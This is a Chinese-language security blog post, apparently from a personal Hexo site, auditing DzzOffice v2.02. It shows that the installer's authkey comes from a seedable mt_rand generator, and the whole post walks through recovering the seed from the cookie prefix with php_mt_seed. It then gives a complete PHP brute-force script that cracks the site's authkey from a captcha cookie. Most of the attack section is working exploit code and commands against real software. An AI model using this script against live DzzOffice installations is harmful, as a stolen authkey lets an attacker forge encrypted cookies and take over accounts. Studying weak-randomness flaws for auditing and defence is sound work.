@@ -1,0 +1,705 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="渗透测试," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="DzzOfficeDzzOffice 是一套开源办公套件。 官网： http:&#x2F;&#x2F;dzz.cc&#x2F; github： https:&#x2F;&#x2F;github.com&#x2F;zyx0814&#x2F;dzzoffice&#x2F;releases&#x2F; 版本： DzzOffice v2.02 漏洞分析其加解密模块大致和Discuz旧版本相同，同样存在authkey被爆破攻击，只是攻击方式略有不同。 authkey生成： 源文件： instal">
+<meta property="og:type" content="article">
+<meta property="og:title" content="代码审计 | DzzOffice 伪随机数攻击">
+<meta property="og:url" content="http://yoursite.com/2020/03/16/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-DzzOffice-%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="zrools">
+<meta property="og:description" content="DzzOfficeDzzOffice 是一套开源办公套件。 官网： http:&#x2F;&#x2F;dzz.cc&#x2F; github： https:&#x2F;&#x2F;github.com&#x2F;zyx0814&#x2F;dzzoffice&#x2F;releases&#x2F; 版本： DzzOffice v2.02 漏洞分析其加解密模块大致和Discuz旧版本相同，同样存在authkey被爆破攻击，只是攻击方式略有不同。 authkey生成： 源文件： instal">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-03-16T05:06:38.000Z">
+<meta property="article:modified_time" content="2020-03-16T05:41:05.117Z">
+<meta property="article:author" content="zrools">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/03/16/代码审计-DzzOffice-伪随机数攻击/"/>
+
+
+
+
+
+  <title>代码审计 | DzzOffice 伪随机数攻击 | zrools</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">zrools</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/16/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-DzzOffice-%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%94%BB%E5%87%BB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="zrools">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zrools">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">代码审计 | DzzOffice 伪随机数攻击</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-03-16T13:06:38+08:00">
+                2020-03-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="DzzOffice"><a href="#DzzOffice" class="headerlink" title="DzzOffice"></a>DzzOffice</h3><p>DzzOffice 是一套开源办公套件。</p>
+<p>官网： <a href="http://dzz.cc/" target="_blank" rel="noopener">http://dzz.cc/</a></p>
+<p>github： <a href="https://github.com/zyx0814/dzzoffice/releases/" target="_blank" rel="noopener">https://github.com/zyx0814/dzzoffice/releases/</a></p>
+<p>版本： DzzOffice v2.02</p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>其加解密模块大致和Discuz旧版本相同，同样存在authkey被爆破攻击，只是攻击方式略有不同。</p>
+<p>authkey生成：</p>
+<p>源文件： install/index.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$authkey &#x3D; substr(md5($_SERVER[&#39;SERVER_ADDR&#39;].$_SERVER[&#39;HTTP_USER_AGENT&#39;].$dbhost.$dbuser.$dbpw.$dbname.$pconnect.substr($timestamp, 0, 6)), 8, 6).random(10);</span><br><span class="line">$_config[&#39;db&#39;][1][&#39;dbhost&#39;] &#x3D; $dbhost;</span><br><span class="line">$_config[&#39;db&#39;][1][&#39;dbname&#39;] &#x3D; $dbname;</span><br><span class="line">$_config[&#39;db&#39;][1][&#39;dbpw&#39;] &#x3D; $dbpw;</span><br><span class="line">$_config[&#39;db&#39;][1][&#39;dbuser&#39;] &#x3D; $dbuser;</span><br><span class="line">$_config[&#39;db&#39;][1][&#39;port&#39;] &#x3D; $port?$port:&#39;3306&#39;;</span><br><span class="line">$_config[&#39;db&#39;][1][&#39;tablepre&#39;] &#x3D; $tablepre;</span><br><span class="line">$_config[&#39;admincp&#39;][&#39;founder&#39;] &#x3D; (string)$uid;</span><br><span class="line">$_config[&#39;security&#39;][&#39;authkey&#39;] &#x3D; $authkey;</span><br><span class="line">$_config[&#39;cookie&#39;][&#39;cookiepre&#39;] &#x3D; random(4).&#39;_&#39;;</span><br><span class="line">$_config[&#39;memory&#39;][&#39;prefix&#39;] &#x3D; random(6).&#39;_&#39;;</span><br></pre></td></tr></table></figure>
+
+<p>源文件： install/include/install_function.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function random($length) &#123;</span><br><span class="line">	$hash &#x3D; &#39;&#39;;</span><br><span class="line">	$chars &#x3D; &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz&#39;;</span><br><span class="line">	$max &#x3D; strlen($chars) - 1;</span><br><span class="line">	PHP_VERSION &lt; &#39;4.2.0&#39; &amp;&amp; mt_srand((double)microtime() * 1000000);</span><br><span class="line">	for($i &#x3D; 0; $i &lt; $length; $i++) &#123;</span><br><span class="line">		$hash .&#x3D; $chars[mt_rand(0, $max)];</span><br><span class="line">	&#125;</span><br><span class="line">	return $hash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>首先通过cookie前缀爆破出随机数种子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_config[&#39;cookie&#39;][&#39;cookiepre&#39;]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str&#x3D;&#39;zRcd&#39;;</span><br><span class="line">$rand_str &#x3D; &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz&#39;;</span><br><span class="line"></span><br><span class="line">for ($i &#x3D; 0; $i &lt; strlen($str); $i++) &#123;</span><br><span class="line">    $pos &#x3D; strpos($rand_str, $str[$i]);</span><br><span class="line">    echo $pos.&#39; &#39;.$pos.&#39; &#39;.&#39;0 &#39;.(strlen($rand_str)-1).&#39; &#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &quot;\n&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>php_mt_seed 地址：<a href="https://www.openwall.com/php_mt_seed/" target="_blank" rel="noopener">https://www.openwall.com/php_mt_seed/</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;php_mt_seed 61 61 0 61 17 17 0 61 38 38 0 61 39 39 0 61 &gt; seeds.txt</span><br></pre></td></tr></table></figure>
+
+<p>接着打开登录界面，F12打开控制台，然后在cookie里取得seccodeXXX和对的值：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.write(&#39;&lt;img src&#x3D;&quot;misc.php?mod&#x3D;seccode&amp;update&#x3D;82310&amp;idhash&#x3D;Sz4Dyn80&quot; class&#x3D;&quot;img-seccode&quot; title&#x3D;&quot;刷新验证码&quot; alt&#x3D;&quot;&quot; width&#x3D;&quot;150&quot; height&#x3D;&quot;34&quot;&gt;&#39;);</span><br></pre></td></tr></table></figure>
+
+<p>通过验证码获取一对密文和明文在本地爆破，seccode生成格式如下：</p>
+<p>源文件： core/function/function_seccode.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dsetcookie(&#39;seccode&#39;.$idhash, authcode(strtoupper($seccode).&quot;\t&quot;.(TIMESTAMP - 180).&quot;\t&quot;.$idhash.&quot;\t&quot;.FORMHASH, &#39;ENCODE&#39;, $_G[&#39;config&#39;][&#39;security&#39;][&#39;authkey&#39;]), 0, 1, true);</span><br></pre></td></tr></table></figure>
+
+<p>然后只需要本地暴力跑authkey前6位验证idhash就可以了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$pre &#x3D; &#39;zRcd&#39;;</span><br><span class="line">$seccode &#x3D; substr(&#39;zRcd_2132_seccodeSz4Dyn80&#39;, -8);</span><br><span class="line">$string &#x3D; &#39;4b57rnl5TRniqDPTjZ5wt7rDw0IJVQEFlVoJwW4LXvaKOfwiQXpiJEBs2mqSUyFXwlzq-6_lrtmfcwesn0E&#39;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; $key &#x3D; &#39;fa5f4fcFeIwLv0GT&#39;;</span><br><span class="line">&#x2F;&#x2F; $res &#x3D; authcode_decode($string, $key);</span><br><span class="line"></span><br><span class="line">$seeds &#x3D; explode(&quot;\n&quot;, file_get_contents(&#39;seeds.txt&#39;));</span><br><span class="line"></span><br><span class="line">for ($i &#x3D; 0; $i &lt; count($seeds); $i++) &#123;</span><br><span class="line">    if(preg_match(&#39;&#x2F;&#x3D; (\d+) &#x2F;&#39;, $seeds[$i], $matach)) &#123;</span><br><span class="line">        mt_srand(intval($matach[1]));</span><br><span class="line">        $authkey &#x3D; random(10);</span><br><span class="line">        echo $authkey;</span><br><span class="line">        if(random(4) &#x3D;&#x3D; $pre)&#123;</span><br><span class="line">            echo &quot;trying $authkey...\n&quot;;</span><br><span class="line">            $res &#x3D; crack($string, $authkey, $seccode);</span><br><span class="line">            if($res) &#123;</span><br><span class="line">                echo &quot;authkey found: &quot;.$res;</span><br><span class="line">                exit();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function crack($string, $authkey, $seccode) &#123;</span><br><span class="line">    $chrs &#x3D; &#39;1234567890abcdef&#39;;</span><br><span class="line">    for ($a &#x3D; 0; $a &lt; 16; $a++) &#123;</span><br><span class="line">        for ($b &#x3D; 0; $b &lt; 16; $b++) &#123;</span><br><span class="line">            for ($c &#x3D; 0; $c &lt; 16; $c++) &#123;</span><br><span class="line">                for ($d &#x3D; 0; $d &lt; 16; $d++) &#123;</span><br><span class="line">                    for ($e &#x3D; 0; $e &lt; 16; $e++) &#123;</span><br><span class="line">                        for ($f &#x3D; 0; $f &lt; 16; $f++) &#123;</span><br><span class="line">                            $key &#x3D; $chrs[$a].$chrs[$b].$chrs[$c].$chrs[$d].$chrs[$e].$chrs[$f].$authkey;</span><br><span class="line">                            $result &#x3D; authcode_decode($string, $key);</span><br><span class="line">                            if (strpos($result, &quot;\t$seccode\t&quot;)) &#123;</span><br><span class="line">                                return $key;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function authcode_decode($string, $key) &#123;</span><br><span class="line">    $key &#x3D; md5($key);</span><br><span class="line">    $ckey_length &#x3D; 4;</span><br><span class="line">    $keya &#x3D; md5(substr($key, 0, 16));</span><br><span class="line">    $keyc &#x3D; substr($string, 0, $ckey_length);</span><br><span class="line"></span><br><span class="line">    $cryptkey &#x3D; $cryptkey &#x3D; $keya . md5($keya . $keyc);</span><br><span class="line">    $key_length &#x3D; strlen($cryptkey);</span><br><span class="line"></span><br><span class="line">    $string &#x3D; base64_decode(substr(str_replace(array(&#39;_&#39;, &#39;-&#39;), array(&#39;&#x2F;&#39;, &#39;+&#39;), $string), $ckey_length));</span><br><span class="line">    $string_length &#x3D; strlen($string);</span><br><span class="line"></span><br><span class="line">    $result &#x3D; &#39;&#39;;</span><br><span class="line">    $box &#x3D; range(0, 255);</span><br><span class="line"></span><br><span class="line">    $rndkey &#x3D; array();</span><br><span class="line">    for ($i &#x3D; 0; $i &lt;&#x3D; 255; $i++) &#123;</span><br><span class="line">        $rndkey[$i] &#x3D; ord($cryptkey[$i % $key_length]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for ($j &#x3D; $i &#x3D; 0; $i &lt; 256; $i++) &#123;</span><br><span class="line">        $j &#x3D; ($j + $box[$i] + $rndkey[$i]) % 256;</span><br><span class="line">        $tmp &#x3D; $box[$i];</span><br><span class="line">        $box[$i] &#x3D; $box[$j];</span><br><span class="line">        $box[$j] &#x3D; $tmp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for ($a &#x3D; $j &#x3D; $i &#x3D; 0; $i &lt; $string_length; $i++) &#123;</span><br><span class="line">        $a &#x3D; ($a + 1) % 256;</span><br><span class="line">        $j &#x3D; ($j + $box[$a]) % 256;</span><br><span class="line">        $tmp &#x3D; $box[$a];</span><br><span class="line">        $box[$a] &#x3D; $box[$j];</span><br><span class="line">        $box[$j] &#x3D; $tmp;</span><br><span class="line">        $result .&#x3D; chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    return $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function random($length) &#123;</span><br><span class="line">    $hash &#x3D; &#39;&#39;;</span><br><span class="line">    $chars &#x3D; &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz&#39;;</span><br><span class="line">    $max &#x3D; strlen($chars) - 1;</span><br><span class="line">    for($i &#x3D; 0; $i &lt; $length; $i++) &#123;</span><br><span class="line">        $hash .&#x3D; $chars[mt_rand(0, $max)];</span><br><span class="line">    &#125;</span><br><span class="line">    return $hash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跑得会相对会比较慢一些，需要注意PHP版本。</p>
+<p>参考：</p>
+<ul>
+<li><a href="https://www.anquanke.com/post/id/86679" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86679</a></li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/03/11/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%A3%E4%B8%8E%E5%88%A9%E7%94%A8/" rel="next" title="常见服务端口与利用">
+                <i class="fa fa-chevron-left"></i> 常见服务端口与利用
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">zrools</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#DzzOffice"><span class="nav-number">1.</span> <span class="nav-text">DzzOffice</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞分析"><span class="nav-number">2.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞复现"><span class="nav-number">3.</span> <span class="nav-text">漏洞复现</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">zrools</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
